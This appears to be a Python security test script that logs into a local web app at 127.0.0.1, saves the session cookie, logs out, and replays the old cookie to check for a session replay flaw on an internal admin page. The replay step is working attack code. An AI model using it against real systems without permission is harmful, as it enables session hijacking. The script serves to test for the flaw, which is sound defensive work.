import requests

# Define the URLs and login credentials
login_url = 'http://127.0.0.1:5000/login'
admin_url = 'http://127.0.0.1:5000/internal'
logout_url = 'http://127.0.0.1:5000/logout'
login_data = {
    'username': 'user1',
    'password': 'password1'
}

# Step 1: Log in to the application
session = requests.Session()
response = session.post(login_url, data=login_data)
print(f"Logged in, status code: {response.status_code}")

# Step 2: Access the admin page and record the session ID
response = session.get(admin_url)
if response.status_code == 200:
    # Extract session ID from cookies (or headers if applicable)
    session_id = session.cookies.get('session_id')
    print(f"Session ID recorded: {session_id}")

# Step 3: Log out from the application
response = session.get(logout_url)
print(f"Logged out, status code: {response.status_code}")

# Step 4: Attempt to access the admin page again without logging in
# Create a new session to simulate a logged-out state
new_session = requests.Session()
response = new_session.get(admin_url)
if 'login required' in response.text.lower():
    print("Login required message confirmed.")

# Step 5: Use the recorded session ID to access the admin page
cookies = {'session_id': session_id}
response = new_session.get(admin_url, cookies=cookies)
print(f"Response status code with old session ID: {response.status_code}")

# Check if the admin page content is accessible
if 'admin content' in response.text.lower():
    print("Session replay vulnerability confirmed: Admin content is accessible.")
else:
    print("No session replay vulnerability detected: Login required message is shown.")
